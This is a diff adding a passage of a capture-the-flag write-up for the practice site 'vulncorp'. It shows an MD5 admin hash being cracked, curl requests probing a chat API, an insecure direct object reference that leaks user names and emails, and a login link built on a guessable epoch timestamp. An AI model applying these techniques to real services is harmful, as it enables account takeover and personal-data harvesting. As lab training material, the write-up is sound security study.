@@ -167,3 +167,213 @@ DB_PASS=sezk87mjd3u7wp0p
 This allows me in to phpmyadmin
 
 ![db](./images/vulncorp-05.png)
+
+Now obviously this is an MD5 hash, luckily crackstation had the answer for the value 'p4ssword'
+
+So I can now login to admin and there is flag no.2
+
+![alt](./images/vulncorp-06.png)
+
+OK so that's probably the clue to start on the chat subdomain :)
+
+![alt](./images/vulncorp-07.png)
+
+OK so lets explore creating an account. Do that and I have access to the 'Staff Room'
+
+![alt](./images/vulncorp-08.png)
+
+Try clicking the 'Create New Room' button and I get the alert
+
+```
+Account has not yet been authorised
+```
+
+There's no indication this will ever work either as the alert is triggered by this javascript
+
+```javascript
+$('.createroom').click( function(){
+    alert('Account has not yet been authorised');
+    return false;
+});
+```
+
+OK so the link to the staff room is on the path /863. Go in to the chat room and it looks like I can post a a message
+
+![alt](./images/vulncorp-09.png)
+
+Except I can't as there's a similar limitation
+
+```javascript
+$('.sendmessage').click( function(){
+    alert('Account has not yet been authorised');
+    return false;
+});
+```
+
+OK so there's also a link to API documentation in the nav bar
+
+![alt](./images/vulncorp-10.png)
+
+OK so I have my own hash and my own API key, I also have the admin hash but not their API Key. What's the bet I can use my API key against their account?
+
+Let's check my own first just to validate it
+
+```
+└─$ curl -v -H "Cookie: ctfchallenge=xxx;" -H "X-Token: ZGVjYWUyMThmYjhjZTJiMmIyMGFkMjExZTVjYWEzN2I0OTBjNWIzNzQ3NTU0Mzk2ZjkyNWUyNzA3MTkyYzU2ZjQzOGNmNTNjZGIyZDU1NzM0YjQ1MjMzZTJkYjVmMWI5OTU3YzZlMTZkMDQyNzU5ZGNhZjBjNDgzNGRiYTU2OWE=" http://chat.vulncorp.co.uk/api/ajvt01Ob/room
+*   Trying 68.183.255.206:80...
+* Connected to chat.vulncorp.co.uk (68.183.255.206) port 80 (#0)
+> GET /api/ajvt01Ob/room HTTP/1.1
+> Host: chat.vulncorp.co.uk
+> User-Agent: curl/7.82.0
+> Accept: */*
+> Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjdkZWJlOTAxMjBiOTU5ZGI2MTAxZjI3MTMxZWNiOGExIn0=;
+> X-Token: ZGVjYWUyMThmYjhjZTJiMmIyMGFkMjExZTVjYWEzN2I0OTBjNWIzNzQ3NTU0Mzk2ZjkyNWUyNzA3MTkyYzU2ZjQzOGNmNTNjZGIyZDU1NzM0YjQ1MjMzZTJkYjVmMWI5OTU3YzZlMTZkMDQyNzU5ZGNhZjBjNDgzNGRiYTU2OWE=
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< server: nginx/1.21.1
+< date: Mon, 18 Jul 2022 09:56:59 GMT
+< content-type: application/json
+< set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulncorp.co.uk
+< transfer-encoding: chunked
+< 
+* Connection #0 to host chat.vulncorp.co.uk left intact
+[{"id":863,"name":"Staff Room"}]
+```
+
+Yup ok that works, now to substitute the admin hash
+
+```
+└─$ curl -v -H "Cookie: ctfchallenge=xxx;" -H "X-Token: ZGVjYWUyMThmYjhjZTJiMmIyMGFkMjExZTVjYWEzN2I0OTBjNWIzNzQ3NTU0Mzk2ZjkyNWUyNzA3MTkyYzU2ZjQzOGNmNTNjZGIyZDU1NzM0YjQ1MjMzZTJkYjVmMWI5OTU3YzZlMTZkMDQyNzU5ZGNhZjBjNDgzNGRiYTU2OWE=" http://chat.vulncorp.co.uk/api/b3XnP2gk/room
+*   Trying 68.183.255.206:80...
+* Connected to chat.vulncorp.co.uk (68.183.255.206) port 80 (#0)
+> GET /api/b3XnP2gk/room HTTP/1.1
+> Host: chat.vulncorp.co.uk
+> User-Agent: curl/7.82.0
+> Accept: */*
+> Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTBkalJsY1hsa2VDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjdkZWJlOTAxMjBiOTU5ZGI2MTAxZjI3MTMxZWNiOGExIn0=;
+> X-Token: ZGVjYWUyMThmYjhjZTJiMmIyMGFkMjExZTVjYWEzN2I0OTBjNWIzNzQ3NTU0Mzk2ZjkyNWUyNzA3MTkyYzU2ZjQzOGNmNTNjZGIyZDU1NzM0YjQ1MjMzZTJkYjVmMWI5OTU3YzZlMTZkMDQyNzU5ZGNhZjBjNDgzNGRiYTU2OWE=
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 403 Forbidden
+< server: nginx/1.21.1
+< date: Mon, 18 Jul 2022 09:58:36 GMT
+< content-type: application/json
+< set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulncorp.co.uk
+< transfer-encoding: chunked
+< 
+* Connection #0 to host chat.vulncorp.co.uk left intact
+["Account Hash does not match ApiKey Account"]
+```
+
+OK no, not against that endpoint anyway. 
+
+Perhaps I'm getting ahead of myself, lets check what I can do with my own hash and the response I get from them
+
+### GET /api/[account-hash]/room
+
+```
+[{"id":863,"name":"Staff Room"}
+```
+
+### POST /api/[account-hash]/room
+
+```
+["Cannot create Room as your account has not been authorised"]
+```
+
+### GET /api/[account-hash]/room/[room-id]
+
+where room-id-863
+```
+{"id":863,"name":"Staff Room","messages":[]}
+```
+
+### POST /api/[account-hash]/room/[room-id]
+
+where room-id-863
+```
+["Cannot create Room as your account has not been authorised"]
+```
+
+### GET /api/[account-hash]/user
+
+```
+[{"id":937,"disabled":false,"name":"No Name","email":"pxxx.sxxxxxx@xxx.com"}]
+```
+
+### POST /api/[account-hash]/user
+
+```
+["Cannot create User as your account has not been authorised"]
+```
+
+### GET /api/[account-hash]/user/[user-id]
+
+```
+{"id":937,"disabled":false,"name":"No Name","email":"pxxx.sxxxxxx@xxx.com"}
+```
+
+With all of these if I try switching out the hash for the admin hash I get the error message back
+
+```
+["Account Hash does not match ApiKey Account"]
+```
+
+All that is but for one, GET /api/[account-hash]/user/[user-id]
+
+For example a GET on /api/b3XnP2gk/user/937 gives the response
+
+```
+["You do not have access to this user"]
+```
+
+OK so perhaps I can get the account details including the email address of the admin just by finding the correct id.
+
+So I get hits for
+
+8
+```
+{"id":8,"disabled":true,"name":"Lexi Irving","email":"lexi.irving.d22f95b538d6e147@vulncorp.co.uk"}
+```
+
+19
+```
+{"id":19,"disabled":false,"name":"Danni Latowski","email":"danni.latowski.4d74650af0cf9095@vulncorp.co.uk"}
+```
+
+50
+```
+{"id":50,"disabled":true,"name":"Dorothy Matthams","email":"dorothy.matthams.184cfd3b07028cd1@vulncorp.co.uk"}
+```
+
+77
+```
+{"id":77,"disabled":true,"name":"[^FLAG^xxx^FLAG^]","email":"flag@vulncorp.co.uk"}
+```
+
+OK cool I now have flag no.3 plus some accounts, one of which is not disabled. And there was a forgot password functionality which accepts email addresses. Lets check that out
+
+![alt](./images/vulncorp-11.png)
+
+When the form is submitted I get another message
+
+```
+If we found a matching email address we will send you an email with a link to log you in
+```
+
+Check my email and I get a link to follow 
+
+```
+Please go to the following link to reset your password: http://chat.vulncorp.co.uk/login/ajvt01Ob/937/1658151772
+```
+
+I follow the link and it signs me straight in, no password needed. It doesn't even ask me to reset the password.
+
+The number at the end of the link looks suspicously like a linux epoch time to me! Quick check
+
+```
+Monday, 18 July 2022 13:42:52
+```
+
+Yup that's much too close to be a coincedence :)
